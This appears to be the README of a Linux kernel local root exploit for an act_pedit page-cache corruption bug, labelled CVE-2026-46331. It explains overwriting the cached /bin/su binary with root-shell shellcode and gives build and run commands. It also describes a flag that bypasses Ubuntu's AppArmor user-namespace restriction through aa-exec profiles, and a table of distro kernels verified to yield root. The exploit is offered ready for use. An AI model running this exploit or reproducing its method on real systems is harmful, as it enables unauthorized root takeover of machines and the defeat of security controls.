# PACKET_EDIT_MEME - aka CVE-2026-46331 #

net/sched `act_pedit` partial-COW page-cache corruption (culprit 899ee91156e5,
present v5.18 .. fixed v7.1-rc7). `packet_edit_meme.c` turns it into unprivileged
local root: a userns CAP_NET_ADMIN child overwrites the cached ELF entry of
setuid-root `/bin/su` with `setgid(0)+setuid(0)+execve("/bin/sh")` shellcode.

    make                     
    ./packet_edit_meme         
    ./packet_edit_meme --ubuntu  # AppArmor-gated Ubuntu: aa-exec bypass first

## Targets (verified 2026-06, unprivileged user -> root)

| Distro           | Kernel           | Flag     | Result |
|------------------|------------------|----------|--------|
| RHEL 10.0        | 6.12.0-228.el10  | (none)   | ROOT   |
| Debian 13 trixie | 6.12.90+deb13.1  | (none)   | ROOT   |
| Ubuntu 24.04.4   | 6.17.0-22        | --ubuntu | ROOT   |
| Ubuntu 26.04     | 7.0.0-14-generic | --ubuntu | FAIL   |

RHEL / Debian: unprivileged userns is open by default, no flag needed. RHEL ships
no `cls_basic` / `em_meta`, so the primitive falls back to `matchall` automatically.

## Ubuntu AppArmor gate

Ubuntu denies unconfined unprivileged userns via two sysctls:

    kernel.apparmor_restrict_unprivileged_userns       # denies unconfined userns creation
    kernel.apparmor_restrict_unprivileged_unconfined   # forces unconfined change_profile to STACK,
                                                       # so an aa-exec permissive profile cannot
                                                       # shed the userns restriction

`--ubuntu` re-execs via `aa-exec -p {trinity,chrome,flatpak}` (profiles that carry
a `userns,` rule).

    24.04.4 : userns=1, unconfined=0  -> aa-exec bypass WORKS
    26.04   : userns=1, unconfined=1  -> aa-exec bypass CLOSED

